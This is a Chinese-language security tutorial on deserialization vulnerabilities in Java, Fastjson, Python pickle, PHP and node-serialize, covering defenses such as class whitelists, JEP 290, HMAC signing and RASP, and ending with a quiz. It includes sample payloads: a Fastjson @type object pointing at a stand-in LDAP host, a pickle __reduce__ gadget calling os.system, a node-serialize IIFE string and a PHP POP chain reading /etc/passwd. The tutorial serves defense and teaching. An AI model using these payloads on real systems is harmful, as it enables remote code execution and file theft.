二十分钟学透反序列化漏洞

反序列化是"把数据还原成对象"的日常操作，但它有一个致命属性：还原过程会自动执行对象里的代码。输入一旦不可信，还原数据就变成了执行命令。这篇把 Java、Fastjson、Python、PHP、Node 五套机制一次讲透，并给出各自能落地的防御。

建议先想清楚自己系统里有哪些"字节流变对象"的入口：RPC、缓存、Cookie、消息队列。
开始前

反序列化为什么危险

一句话原理：反序列化不是"读数据"，是"重建对象"，而重建过程会调用对象上的方法。如果字节流来自不可信来源，攻击者就能精心构造对象图，让框架在"还原数据"时替他执行代码。

自动触发：Java 的 readObject()、PHP 的 __wakeup()/__destruct()、Python 的 __reduce__() 都是反序列化框架自动调用的钩子。开发者写这些方法时假设"只有我自己的数据会进来"，攻击者直接提供字节流，钩子照常触发。
多语言通用：这不是 Java 独有的问题。任何"把外部输入还原成对象/结构"的机制都有同类风险：Java ObjectInputStream、Python pickle、PHP unserialize()、Node node-serialize、Ruby Marshal、.NET BinaryFormatter。共性：输入可控 + 还原时执行代码。
漏洞在接收端：多数人以为"序列化是我们自己做的就安全"。实际上只要反序列化的一端会接收外部字节流（HTTP 参数、消息队列、缓存、Cookie、上传文件），风险就成立——数据可能在链路任何一环被篡改或注入。
先建立一个核心认知：JSON.parse 是安全的——它只产生纯数据（字典、数组、字符串），不会执行对象方法。不安全的是"带类型的反序列化"：把 JSON/字节流还原成某个具体类的实例（Java 的 ObjectInputStream、Fastjson 的 autoType、PHP 的 unserialize）。JSON 数据格式本身无罪，有罪的是"顺便把类型信息也交给外部指定"。
模块 1

通用原理与各语言入口

所有反序列化漏洞共享同一个攻击模型：构造一个对象图，使还原过程自动调用到危险方法（执行命令、加载字节码、发起 JNDI 查询）。不同语言只是"自动触发点"不同。

语言/库危险入口自动触发点
Java 原生ObjectInputStream.readObject()readObject / readExternal / readResolve 回调
Java JSON 库Fastjson parseObject(@type)setter / 构造器按类型实例化
Pythonpickle.loads() / marshal.loads()__reduce__ 返回的可调用对象
PHPunserialize()魔术方法 __wakeup/__destruct/__toString
Nodenode-serialize.unserialize()IIFE 标记 _$$ND_FUNC$$_ 直接 eval
RubyMarshal.load()allocate + 初始化链

三个判断问题（拿到一个入口先问自己）

  1. 这个字节流/字符串可能被外部控制吗？HTTP 参数、Cookie、消息队列、共享缓存、文件上传——只要有一个环节攻击者能碰，答案就是"可能"。
  2. 反序列化时会执行对象上的方法吗？带类型还原的原生序列化全是"会"；纯 JSON/XML 解析（无类型绑定）才是"不会"。
  3. 执行到的方法能触达危险操作吗？反射调用、JNDI、类加载、模板引擎、命令执行——类库里这类"合法但可被组合"的方法就是 gadget。
术语先对齐：gadget（ gadgets ）指类库中"本身合法、但在反序列化时能被恶意组合"的方法片段；gadget chain 指把多个 gadget 串成的调用链。Java 社区的 ysoserial 工具把这些链打包成了"输入一串字节、目标执行一条命令"的形态。理解这一点很关键：攻击者不需要在你的代码里找漏洞，他只需要你的依赖里存在足够多的 gadget。
模块 2

Java 反序列化

Java 原生序列化是这套漏洞的代名词：2015 年 Apache Commons Collections gadget 公开后，Java 反序列化连续多年位居 CWE 高危榜前列。

1. 机制：readObject 是自动触发的钩子

// 反序列化时，框架会自动调用对象上的 readObject（如果定义了）
public class Payload implements Serializable {
    private void readObject(ObjectInputStream in) {
        in.defaultReadObject();
        // 开发者以为这里只会处理"自己人"的数据
        Runtime.getRuntime().exec("...");   // 但字节流可被外部构造
    }
}
// 注意：readObject 是 private 的，反序列化框架通过反射调用它 —— 这正是危险所在

2. Commons Collections gadget 链（概念级示意）

// 核心思路：类库中的 Transformer 组合可以被"数据驱动"地拼成任意方法调用链
// Commons Collections 3.1/3.2.1 中的关键 gadget（概念级）：
Transformer[] chain = new Transformer[]{
    new ConstantTransformer(Runtime.class),          // 1. 拿到 Class 对象
    new InvokerTransformer("getMethod", ...),   // 2. 反射查 getRuntime 方法
    new InvokerTransformer("invoke", ...),      // 3. 调用拿到 Runtime 实例
    new InvokerTransformer("exec", ...),        // 4. exec(命令)
};
new ChainedTransformer(chain);   // 串成一个 Transformer

// 然后把它藏进 LazyMap/TransformedMap 等"反序列化时会触发 transform 的值"里，
// 序列化成字节流。目标反序列化时链自动执行 → RCE。
// 真实利用由 ysoserial 一键生成，但上面的四步就是全部原理。
为什么 Java 生态反复中招：gadget 藏在依赖库里而不是业务代码里——你的代码什么都没写错，但只要 classpath 上有 Commons Collections、Groovy、C3P0、Rome、Spring 的某些版本，链就存在。这就是为什么"升级依赖 + 反序列化白名单"必须双管齐下。JDK 自带的 AnnotationInvocationHandler 等类也能当 gadget 起点，所以单纯升级 JDK 不够。

3. JDK 层面的防御：JEP 290

  • JEP 290（JDK 9+ 内置；JDK 8u121 / 7u131 / 6u141 回溯移植）给 ObjectInputStream 加了序列化过滤机制：反序列化时按类名/类路径图做白名单或黑名单校验，超范围直接拒绝。
  • 配置方式：系统属性 jdk.serialFilter（全局，如 -Djdk.serialFilter=maxdepth=100;java.*;!* 形式按需配置），或 ObjectInputFilter API 按流设置。
  • 局限：JEP 290 是缓解不是根治——它按类名过滤，类名混淆/变形的绕过手法长期存在，且默认配置并非白名单模式。不能把"升了 JDK"当成修复完成。

4. 应用层白名单（最可靠的自持方案）

// 方式一：继承 ObjectInputStream，在 resolveClass 里做类白名单
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of(
        "com.example.OrderMessage", "java.util.ArrayList", "java.lang.Number");
    public SafeObjectInputStream(InputStream in) throws IOException { super(in); }
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
        if (!ALLOWED.contains(desc.getName())) {
            throw new InvalidObjectException("非白名单类: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// 方式二：Apache Commons IO 的 ValidatingObjectInputStream
new ValidatingObjectInputStream(in).accept(OrderMessage.class, ArrayList.class);
Java 反序列化防护的正确顺序：① 能不用就不用——跨服务传数据换 JSON/protobuf/gRPC（这是根治，也是本篇最重要的建议）；② 必须用的地方上类白名单（SafeObjectInputStream），只放行业务 DTO，一个 gadget 类都不放；③ 全局配 jdk.serialFilter 兜底 + 升级依赖消除已知 gadget；④ 入口加完整性校验（HMAC 签名），字节流被改过直接拒。
模块 3

Fastjson：autoType 的十年攻防

Fastjson 的问题不在 JSON，在它特有的 autoType 特性：允许在 JSON 里用 @type 字段指定反序列化目标类——等于把"类型"这个决定权交给了外部输入。

1. 攻击形态

// 攻击者提交的 JSON：用 @type 指定一个"有危险 setter/构造行为"的类
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/exp",
  "autoCommit": true
}
// fastjson 按 @type 实例化该类，随后调用其 setter
// setDataSourceName 内部会触发 JNDI 查询 → 从远程 LDAP 加载恶意类 → RCE
// 同类思路的还有 TemplatesImpl（字节码加载）、各种日志/连接池类的危险 setter

2. 版本与状态（选型时直接查这个表）

版本线状态建议
≤ 1.2.24autoType 默认开启，漏洞密集爆发期必须升级，历史漏洞编号两位数
1.2.25 ~ 1.2.47默认关闭 autoType，但存在多轮绕过升级，且审计是否有人手动开启
1.2.68 ~ 1.2.80引入 safeMode、checkAutotype 缓存与类黑名单继续升级；黑名单式防御有滞后性
≥ 1.2.83 / fastjson2默认更严格，autoType 需显式开启且默认白名单化新项目直接用 fastjson2；老版本尽快升到 1.2.83+

3. 修复措施

  • 升级到 1.2.83+ 或迁移 fastjson2——这是性价比最高的一步。
  • 关闭 autoType：不开启 ParserConfig.setAutoTypeSupport(true)；如果业务必须用，配autotype 白名单（只放行自己的 DTO 类）。
  • 输入侧过滤：对不可信 JSON 检查是否含 @type 字段，出现即拒绝或剥离。
  • 依赖层：确保 classpath 上没有 JNDI 可利用类（或升级相关依赖）；禁用远程 LDAP 可由 JVM 参数缓解。
Fastjson 类漏洞的通用教训："让数据携带类型信息，并由数据指定类型"是这类漏洞的总根源。选型时问一句：解析 JSON 时能不能被外部指定实例化哪个类？能，就有 fastjson 同款风险；不能（如 Gson、Jackson 默认配置、原生 JSON.parse），这条攻击面就不存在。Jackson 的开机关联是 disableDeserializationFeature，别把 @type 式功能随意打开。
模块 4

Python pickle

pickle 的设计目标就是"完整还原 Python 对象"，还原机制通过 __reduce__ 协议委托给一个可调用对象——这个可调用对象可以是任何函数，包括 os.system。对不可信数据调用 pickle.loads() 等于直接执行代码。

# 恶意序列化载荷的构造（概念级，演示原理）
import pickle, os

class Evil:
    def __reduce__(self):
        # 反序列化时框架会自动执行这个返回的 (可调用对象, 参数)
        return (os.system, ("id",))

payload = pickle.dumps(Evil())
# payload 是一串字节。任何拿到它并调用 pickle.loads(payload) 的进程都会执行 id 命令

# 危险场景：Celery/RabbitMQ 任务体、Redis 缓存、Django session、模型权重文件
# 这些场景的数据一旦可被外部写入或篡改，pickle.loads 就是 RCE 入口

检测与修复

检测方法修复措施
代码审计 pickle.loads/marshal.loads 的入参来源跨边界传数据一律用 JSON（json.loads 只产生纯数据）
检查 Redis/RabbitMQ 里存储对象的序列化格式确实需要 pickle 的场景：HMAC 签名后再 loads，验签失败直接拒
检查 PyYAML 是否用了 yaml.load（同样能构造任意对象）YAML 用 yaml.safe_load；永远不用 yaml.load 处理不可信输入
模型/权重文件来源是否可信第三方 .pkl/.pt 文件先沙箱加载，勿直接 pickle.loads
同类陷阱不止 pickle：marshal 同样能执行代码；yaml.load 可构造任意 Python 对象（包括危险构造器）；eval/exec 处理 JSON 字符串则是另一类经典错误。共同点是：把"字符串/字节"变成"可执行对象"的接口，都要当代码执行看待。
模块 5

PHP 反序列化与 POP 链

PHP 的 unserialize() 会按字符串里的类名重建对象，并自动触发魔术方法。PHP 生态把这类利用叫 POP 链（Property Oriented Programming）——和 Java gadget chain 同一思想：串联多个类的魔术方法，一步步走到危险函数。

自动触发点：魔术方法

魔术方法触发时机
__wakeup()unserialize 重建对象时立即调用
__destruct()对象被销毁时（脚本结束或 unset）调用
__toString()对象被当作字符串使用时（如 echo、拼接）调用
__call()调用不存在的方法时回调
// POP 链的概念级示意（各步骤都"看起来合法"）
class LogWriter {
    public $filename = '/tmp/app.log';
    public function __destruct() {
        file_put_contents($this->filename, '...');   // 1. 析构即写文件
    }
}
class FileHelper {
    public $path;
    public function __toString() {
        return file_get_contents($this->path);          // 2. 当字符串用即读文件
    }
}
class View {
    public $tpl;
    public function __destruct() {
        echo $this->tpl;   // 3. echo 一个对象 → 触发其 __toString
    }
}
// 攻击者构造序列化字符串：View.tpl = FileHelper(path='/etc/passwd')
// unserialize 后 View 析构 → echo 触发 FileHelper.__toString → 读出任意文件内容
// 若链尾是 call_user_func/system 之类，即 RCE —— WordPress 等生态历史漏洞多为此类

检测与修复

  • 入口排查：审计所有 unserialize() 调用——Cookie、缓存、API 参数、模板变量，入参是否可能来自用户。
  • 替代方案：跨边界/用户侧数据一律 json_decode（纯数据，无对象重建）。
  • 必须 unserialize 时：先验签（HMAC）+ 对可接受类做白名单（PHP 7.4+ 可在 unserialize 第二个参数传 allowed_classes，设为 false 即全部拒绝）。
  • 框架侧：升级 CMS/框架及插件——历史 pop 链大量存在于旧版 WordPress 插件与框架组件中。
PHP 的一个原生便利：unserialize($data, ['allowed_classes' => false]) 可以一行关闭"类重建"，只还原数组/标量。很多场景（存配置、存数组）根本不需要还原成对象，这个参数应该成为团队编码规范里的默认项。
模块 6

Node.js node-serialize 与 JSON 边界

node-serialize 曾经是 Node 生态最流行的序列化库之一，它的 unserialize() 为了支持函数序列化，引入了 IIFE 立即执行标记——这个标记在 JSON 数据里出现，等价于 eval。

// node-serialize 的载荷形态（概念级）：IIFE 标记包裹任意 JS
// 序列化函数时会产生这样的"数据"：
"{\"__type\":\"_$$ND_FUNC$$_function(){ return require('child_process').exec('id'); }()\"}"

// unserialize 时检测到 _$$ND_FUNC$$_ 标记 → 把里面内容当代码 eval
// 于是"还原数据"变成"执行任意 JS" —— 典型触发场景：Cookie、session、Redis 缓存

// 对比：JSON.parse 只还原纯数据，永远安全
JSON.parse('{"a":1}');        // ✓ 只有数据，没有代码执行路径
eval('(' + userInput + ')');     // ✗ 字符串变代码，同类错误的另一种写法

检测与修复

检测方法修复措施
搜依赖里的 node-serialize、serialize-to-js 类库移除 node-serialize（官方已不维护），统一用 JSON
检查 Cookie/session/缓存里是否出现 _$$ND_FUNC$$_反序列化入口加特征检测，命中即拒绝并告警
审计任何 eval/new Function 处理外部字符串的代码用 JSON.parse + 显式类型校验；函数序列化需求用安全替代方案
JSON 边界的正确认知：JSON 数据格式本身没有"类型指定"能力，所以 JSON.parse 安全；危险的是"在 JSON 里塞类型字段并让库据此实例化类"的约定——Fastjson 的 @type 是这个坑的 Java 版，node-serialize 的函数标记是这个坑的 JS 版。选型标准：解析器是否允许输入指定要实例化的类型/代码。允许，就要当代码执行面来防。
模块 7

防御体系：三层纵深

反序列化防御没有银弹，但分层做全，风险可控。按优先级从根治到兜底分三层。

层级措施要点
L1 协议层（根治）不用原生序列化：跨服务/跨边界一律 JSON、protobuf、MessagePack 等纯数据格式消灭"输入指定类型"的可能，是唯一能根治的一层。旧系统迁移成本高，但收益最大
L2 入口层（核心）白名单 + 签名：类白名单（Java resolveClass / PHP allowed_classes）；字节流 HMAC 签名验签白名单只放行业务 DTO；签名防篡改，密钥入 KMS
L3 运行时（兜底）JEP 290 过滤 + 依赖升级消除 gadget + RASP 运行时 HookJEP 290 全局配 jdk.serialFilter；RASP 在 readObject/resolveClass 处检测异常类

检测与监控（运行时发现攻击）

_$$ND_FUNC$$_node-serialize IIFE 标记，出现在请求/Cookie 里即尝试利用

RASP 在这类漏洞上的独特价值：反序列化发生在应用进程内，网络层 WAF 看不到对象图，而 RASP 直接 Hook ObjectInputStream.resolveClass——反序列化真正实例化每个类的瞬间。此时做类白名单校验、异常类告警、阻断，能把"字节流特征识别"升级为"行为识别"，是绕过编码变形的有效兜底。没条件上 RASP 的团队，至少要在反序列化入口加自定义 Filter + 告警日志。
模块 8

十个常见坑

1
以为"我们用 JSON 所以安全"
JSON.parse 安全，但 Fastjson 的 @type、node-serialize 的函数标记、某些库的"多态反序列化"开关，都让 JSON 数据携带类型信息。安全的是纯数据 JSON，不是"叫 JSON 的库"。
2
签名校验了，但没防重放和过期
HMAC 验签通过后，攻击者把旧载荷原样重放依然成立。签名载荷要带时间戳/随机数，并校验时效窗口。
3
升级了 JDK 就认为万事大吉
JEP 290 是缓解不是根治：类名变形绕过、filter 默认配置非白名单、依赖里的 gadget 依旧存在。JDK 升级 + 应用层白名单 + 依赖治理，三件事都要做。
4
用黑名单过滤危险类
类数量浩如烟海，黑名单永远滞后；且攻击者会找没被收录的 gadget。白名单才是正解——只允许业务 DTO，其余全部拒绝。
5
不限制序列化数据的大小和对象图深度
深层嵌套的对象图、超大数组能让反序列化过程内存飙升/CPU 打满，成为 DoS 入口。入口要限制字节长度、图深度和元素数量。
6
Redis/RabbitMQ 里的"内部数据"被间接注入
缓存键或队列消息可被其他入口（SSRF、未授权 Redis）写入恶意序列化数据，业务取出后 loads 即中招。中间件也要鉴权和网络隔离，别当可信通道。
7
内网 RPC 用原生序列化且无认证
"内网流量不可信"是零信任的基本假设——任何一个服务被打穿，原生序列化 RPC 就是横向移动的高速公路。内网调用同样要认证 + 纯数据协议。
8
Python 用 pickle 做缓存/队列且键可控

自测

六道题

1. Java 原生序列化字节流的起始魔数是？
正确答案：AC ED 00 05。Java 序列化流的固定头。Base64 编码后常以 rO0AB 开头——在日志/流量里看到它，说明有人在尝试 Java 反序列化攻击，应立即告警排查。
2. Java 反序列化漏洞的根本机制是？
正确答案：readObject 等回调自动触发。反序列化不是"读数据"而是"重建对象"，重建时框架反射调用 readObject；攻击者把类库里的 gadget（如 Commons Collections 的 Transformer 链）串成对象图，还原过程就替他执行了任意方法。注意漏洞往往在依赖库里，不在业务代码里。
3. Python 中 pickle.loads() 处理不可信数据为什么危险？
正确答案：__reduce__ 自动调用。对象定义 __reduce__ 返回 (callable, args)，反序列化时框架原样执行——callable 可以是 os.system。典型危险场景：Celery 任务体、Redis 缓存、Django session。防护：换 JSON，或 HMAC 验签后再 loads。
4. Fastjson 历史漏洞的核心原因是？
正确答案：@type 指定目标类。Fastjson 按 @type 实例化对应类并调用其 setter，攻击者选一个"有危险 setter"的类（如触发 JNDI 的 JdbcRowSetImpl）即 RCE。修复：升级 1.2.83+/fastjson2、关闭或白名单化 autoType。
5. 关于 node-serialize，正确的说法是？
正确答案：IIFE 标记即 eval。node-serialize 为支持函数序列化引入 _$$ND_FUNC$$_ 标记，反序列化时把标记内内容当代码执行——数据里出现该标记就等价于一次 eval。触发场景（Cookie、session、缓存）里数据往往来自客户端。该库已不维护，应替换为 JSON。
6. 反序列化防御的第一优先级措施是？
正确答案：换纯数据协议。加密只防"看"不防"改+触发"；WAF 特征可被编码变形绕过且是告警层。真正根治的是消灭"输入指定类型/代码"的可能——L1 协议层。在此之上再做类白名单（L2）和 JEP 290/RASP 兜底（L3）。
